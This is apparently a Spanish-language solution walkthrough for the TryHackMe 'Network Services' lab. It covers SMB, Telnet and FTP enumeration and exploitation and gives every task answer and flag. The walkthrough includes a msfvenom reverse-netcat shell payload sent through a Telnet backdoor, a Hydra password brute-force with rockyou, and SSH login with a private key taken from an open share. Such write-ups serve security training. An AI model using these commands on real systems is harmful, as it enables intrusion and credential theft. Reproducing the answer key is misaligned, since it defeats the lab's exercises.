# Network Services

| **Dificultad** | Easy |
| **Tipo** | Enumeración y explotación de servicios de red (laboratorio) |
| **Slug** | `networkservices` |
| **Link** | [TryHackMe](https://tryhackme.com/room/networkservices) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | SMB / smbclient / enum4linux / Telnet / tcpdump / msfvenom / FTP / vsftpd / Hydra |
| **Impacto** | Sala introductoria en la que se enumeran y explotan tres servicios de red muy comunes: SMB (puertos 139/445), Telnet (en un puerto no estándar) y FTP, cubriendo teoría, enumeración, explotación y la captura de las flags de cada segmento. |

---

**Contexto:** El laboratorio recorre tres servicios de red y las malas configuraciones que los hacen explotables. El segmento SMB empieza con la teoría del protocolo (respuesta-petición sobre TCP/IP, implementación Samba sobre Unix) y la enumeración con enum4linux/nmap que descubre el share "profiles" en la máquina POLOSMB (Windows 6.1). Con él se obtienen las claves `.ssh` del perfil de John Cactus y, tras cambiar sus permisos, se entra por SSH para leer la flag smb.txt. El segmento Telnet explota un servidor Telnet oculto en un puerto no estándar (8012/tcp) que responde "SKIDY'S BACKDOOR." y ejecuta los comandos enviados con el prefijo `.RUN`, lo que permite hacer ping, generar un payload `cmd/unix/reverse_netcat` con msfvenom y recibir una reverse shell con netcat. El segmento FTP enumera un vsftpd en el puerto 21 con acceso anónimo (PUBLIC_NOTICE.txt), descubre el usuario mike, crackea su contraseña con Hydra y descarga ftp.txt.

## Solucionario

### Task 1: Conectando

**Explicación:** Despliegue del laboratorio: se arranca la máquina objetivo y la AttackBox (o la VPN), se espera el arranque y se comprueba la conectividad.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Listo? ¡Empecemos! | `No answer needed` |

### Task 2: Entendiendo SMB

**Explicación:** SMB (Server Message Block) es un protocolo de comunicación cliente-servidor para compartir archivos, impresoras y otros recursos. Es un protocolo de *respuesta-petición* (`response-request`): transmite varios mensajes entre cliente y servidor para establecer la conexión. Los clientes se conectan a los servidores usando `TCP/IP` (NetBIOS sobre TCP/IP). La implementación de código abierto Samba, que permite interoperar SMB con otros sistemas, corre sobre `Unix`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué significa SMB? | `Server Message Block` |
| 2 | ¿Qué tipo de protocolo es SMB? | `response-request` |
| 3 | ¿Qué usan los clientes para conectarse a los servidores? | `TCP/IP` |
| 4 | ¿En qué sistemas corre Samba? | `Unix` |

### Task 3: Enumerando SMB

**Explicación:** Un escaneo nmap de todos los puertos muestra `3` puertos abiertos y SMB en `139/445`. Con enum4linux se extrae la política del dominio: workgroup `WORKGROUP`, nombre de máquina `POLOSMB` y versión de sistema operativo `6.1` (Windows 7). El listado de shares destaca `profiles`, un share interesante para investigar.

```bash
nmap -p- 10.10.10.2
enum4linux -a 10.10.10.2
smbclient -L //10.10.10.2/
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Haz un escaneo nmap de tu elección: ¿cuántos puertos están abiertos? | `3` |
| 2 | ¿En qué puertos corre SMB? | `139/445` |
| 3 | Empezando con enum4linux, haz una enumeración básica completa: ¿cuál es el nombre del workgroup? | `WORKGROUP` |
| 4 | ¿Qué nombre muestra la máquina? | `POLOSMB` |
| 5 | ¿Qué versión de sistema operativo está corriendo? | `6.1` |
| 6 | ¿Qué share destaca como algo que podríamos querer investigar? | `profiles` |

### Task 4: Explotando SMB

**Explicación:** La sintaxis de smbclient para acceder a un share "secret" como usuario "suit" es `smbclient //10.10.10.2/secret -U suit -p 445`. El share `profiles` no permite acceso anónimo (`Y`: sí permite), y dentro vemos la carpeta del perfil: pertenece a `John Cactus`, tiene habilitado el servicio `ssh` para teletrabajo y contiene el directorio `.ssh`. La clave útil es `id_rsa`; tras descargarla y aplicar `chmod 600 id_rsa`, se entra por SSH como el usuario detectado y se lee la flag.

```bash
smbclient //10.10.10.2/secret -U suit -p 445
smbclient //10.10.10.2/profiles -U anonymous -p 445
get id_rsa
chmod 600 id_rsa
ssh <usuario>@10.10.10.2 -i id_rsa
cat smb.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál sería la sintaxis correcta para acceder a un share SMB llamado "secret" como usuario "suit" en la máquina 10.10.10.2 por el puerto por defecto? | `smbclient //10.10.10.2/secret -U suit -p 445` |
| 2 | ¡Genial! Ahora que dominas la sintaxis, vamos a intentar explotar la vulnerabilidad. | `No answer needed` |
| 3 | Veamos si el share interesante permite acceso anónimo. ¿Permite el share el acceso anónimo? (Y/N) | `Y` |
| 4 | ¡Genial! Echa un vistazo en busca de documentos interesantes. ¿A quién podemos suponer que pertenece esta carpeta de perfil? | `John Cactus` |
| 5 | ¿Qué servicio se ha configurado para permitirle trabajar desde casa? | `ssh` |
| 6 | Sabiendo esto, ¿en qué directorio del share deberíamos mirar? | `.ssh` |
| 7 | Este directorio contiene claves de autenticación. ¿Cuál de estas claves nos es más útil? | `id_rsa` |
| 8 | Descarga este archivo, cambia los permisos a "600" con `chmod 600 [file]` y usa la información recopilada para entrar por el servicio con la clave. ¿Cuál es la flag de smb.txt? | `THM{smb_is_fun_eh?}` |

### Task 5: Entendiendo Telnet

**Explicación:** Telnet es un protocolo de aplicación que permite, con un cliente telnet, conectarse a y ejecutar comandos en una máquina remota con un servidor telnet. Su uso ha sido reemplazado lentamente por `SSH`. La sintaxis para conectar a un servidor Telnet con la IP 10.10.10.3 en el puerto 23 es `telnet 10.10.10.3 23`. La falta de `encryption` hace que toda la comunicación Telnet viaje en texto plano.

```bash
telnet 10.10.10.3 23
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué es Telnet? | `application protocol` |
| 2 | ¿Qué ha reemplazado lentamente a Telnet? | `SSH` |
| 3 | ¿Cómo conectarías a un servidor Telnet con IP 10.10.10.3 en el puerto 23? | `telnet 10.10.10.3 23` |
| 4 | La falta de ¿qué? hace que toda la comunicación Telnet sea en texto plano. | `encryption` |

### Task 6: Enumerando Telnet

**Explicación:** Un escaneo nmap con `-p-` sobre la máquina muestra `1` puerto abierto, el `8012`/`tcp` (un puerto sin asignar estándar). Sin la etiqueta `-p-` aparecen `0` puertos abiertos: al mover Telnet a un puerto no estándar queda fuera de los top-1000 de nmap. El título devuelto al conectar sugiere que el puerto se usa como `a backdoor`; la posible propiedad se atribuye a `Skidy`. Esta enumeración alimenta la fase de explotación.

```bash
nmap -p- 10.10.10.3
nmap 10.10.10.3
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos puertos están abiertos en la máquina objetivo? | `1` |
| 2 | ¿Qué puerto es este? | `8012` |
| 3 | Este puerto está sin asignar, pero muestra el protocolo que usa: ¿qué protocolo es? | `tcp` |
| 4 | Vuelve a ejecutar nmap sin la etiqueta `-p-`: ¿cuántos puertos aparecen como abiertos? | `0` |
| 5 | Aquí vemos que asignar telnet a un puerto no estándar lo deja fuera de la lista de puertos comunes de nmap. | `No answer needed` |
| 6 | Según el título devuelto, ¿para qué crees que podría servir este puerto? | `a backdoor` |
| 7 | ¿A quién podría pertenecer? Recopilar posibles nombres de usuario es importante en la enumeración. | `Skidy` |
| 8 | Guarda siempre la información que encuentres durante la enumeración para usarla en la explotación. | `No answer needed` |

### Task 7: Explotando Telnet

**Explicación:** Al conectar al puerto 8012 el servidor responde el mensaje de bienvenida `SKIDY'S BACKDOOR.`. Los comandos escritos no devuelven salida (`N`), pero con un tcpdump local escuchando ICMP se comprueba que ejecutan comandos del sistema con el prefijo `.RUN`: tras `ping TU_IP -c 1` se reciben pings (`Y`). Se genera un reverse shell con `msfvenom -p cmd/unix/reverse_netcat lhost=TU_IP lport=4444 R` (que usa `mkfifo`), se abre el listener `nc -lvnp 4444` y, al ejecutar el payload con `.RUN`, se recibe la shell; `flag.txt` contiene la flag.

```bash
sudo tcpdump -i tun0 icmp
msfvenom -p cmd/unix/reverse_netcat lhost=TU_IP lport=4444 R
nc -lvnp 4444
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Vamos a conectarnos al puerto Telnet usando la sintaxis vista. | `No answer needed` |
| 2 | ¡Genial! Es una conexión Telnet abierta. ¿Qué mensaje de bienvenida recibimos? | `SKIDY'S BACKDOOR.` |
| 3 | Probemos a ejecutar comandos: ¿devolvemos algo al enviar cualquier entrada en la sesión Telnet? (Y/N) | `N` |
| 4 | Mmm, es extraño. Comprobemos si lo que escribimos se ejecuta como comando del sistema. | `No answer needed` |
| 5 | Esto lanza un listener de tcpdump, específicamente escuchando tráfico ICMP, en el que se basan los pings. | `No answer needed` |
| 6 | Usa el comando "ping [IP THM local] -c 1" a través de la sesión Telnet (prefijado con .RUN). ¿Recibimos algún ping? (Y/N) | `Y` |
| 7 | ¡Genial! Esto significa que podemos ejecutar comandos del sistema y alcanzar nuestra máquina local. | `No answer needed` |
| 8 | Generaremos un reverse shell con msfvenom: `msfvenom -p cmd/unix/reverse_netcat lhost=[IP tun0 local] lport=4444 R`. ¿Qué usa este payload para el manejo de la shell? | `mkfifo` |
| 9 | ¿Cómo quedaría el comando del listener para el puerto que seleccionamos en el payload? | `nc -lvnp 4444` |
| 10 | Ahora copia y pega el payload en la sesión Telnet y ejecútalo como comando para recibir la shell. | `No answer needed` |
| 11 | ¡Éxito! ¿Cuál es el contenido de flag.txt? | `THM{y0u_g0t_th3_t3ln3t_fl4g}` |

### Task 8: Entendiendo FTP

**Explicación:** FTP (File Transfer Protocol) permite transferir archivos de forma remota por la red usando un modelo de comunicación `client-server`. Su puerto estándar es el `21` y existen `2` modos de conexión (activo y pasivo).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué modelo de comunicaciones usa FTP? | `client-server` |
| 2 | ¿Cuál es el puerto estándar de FTP? | `21` |
| 3 | ¿Cuántos modos de conexión FTP hay? | `2` |

### Task 9: Enumerando FTP

**Explicación:** El escaneo de la máquina FTP muestra `3` puertos abiertos (con servicio FTP en el `21`). Con `-sV` se identifica la variante `vsftpd`. Probando login anónimo ("anonymous" sin contraseña) se ve el archivo `PUBLIC_NOTICE.txt`; su contenido (mención a que los usuarios envíen sus contraseñas al administrador o a "mike") da el posible nombre de usuario `mike`.

```bash
nmap -sC -sV 10.10.10.4
ftp 10.10.10.4
# anonymous

ftp> ls
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuántos puertos están abiertos en la máquina objetivo? | `3` |
| 2 | ¿En qué puerto corre FTP? | `21` |
| 3 | ¿Qué variante de FTP está corriendo? | `vsftpd` |
| 4 | ¿Cuál es el nombre del archivo en el directorio FTP anónimo? | `PUBLIC_NOTICE.txt` |
| 5 | ¿Qué posible nombre de usuario creemos que podría ser? | `mike` |
| 6 | Ya tenemos detalles del servidor FTP y un posible usuario. Veamos qué podemos hacer con eso. | `No answer needed` |

### Task 10: Explotando FTP

**Explicación:** Con Hydra se fuerza la contraseña del usuario `mike` contra el servicio FTP; la contraseña encontrada es `password`. Con esas credenciales se entra por `ftp 10.10.10.4` y se descarga `ftp.txt`, que contiene la flag.

```bash
hydra -l mike -P /usr/share/wordlists/rockyou.txt 10.10.10.4 ftp
ftp 10.10.10.4
# mike : password
ftp> get ftp.txt
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cuál es la contraseña del usuario "mike"? | `password` |
| 2 | ¡Bingo! Conéctate al servidor FTP como este usuario con "ftp [IP]" e introduce las credenciales cuando lo pida. | `No answer needed` |
| 3 | ¿Qué es ftp.txt? | `THM{y0u_g0t_th3_ftp_fl4g}` |

### Task 11: Conclusión

**Explicación:** Repaso final: cómo enumerar y explotar SMB, Telnet y FTP, y los riesgos de las malas configuraciones de los servicios de red.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Bien hecho, lo has conseguido. | `No answer needed` |

---

**Metodología:** Cada segmento sigue el ciclo enumerar → explotar. En SMB se usa nmap y enum4linux para extraer workgroup, nombre, versión y shares; se conecta al share "profiles" con smbclient y, a partir de las claves `.ssh` y la identidad de John Cactus, se entra por SSH con `id_rsa` (permisos 600) para leer smb.txt. En Telnet se descubre un backdoor en el puerto 8012; con tcpdump se confirma la ejecución remota de comandos con el prefijo `.RUN`, se genera un payload de msfvenom (`cmd/unix/reverse_netcat`, basado en `mkfifo`) y se recibe una reverse shell en `nc -lvnp 4444`. En FTP se identifica vsftpd en el 21, se comprueba el acceso anónimo que muestra PUBLIC_NOTICE.txt, se deduce el usuario mike, se crackea con Hydra y se descarga ftp.txt.

**Learning chain:** teoría del servicio → enumeración (nmap/enum4linux) → identificación de misconfiguraciones → explotación con smbclient, Telnet/msfvenom y FTP/Hydra → captura de flags.

**MITRE ATT&CK:** T1046 (Network Service Discovery), T1135 (Network Share Discovery), T1110.001 (Password Guessing), T1059.004 (Command and Scripting Interpreter: Unix Shell), T1083 (File and Directory Discovery)

**Fuente:** [TryHackMe - Network Services](https://tryhackme.com/room/networkservices)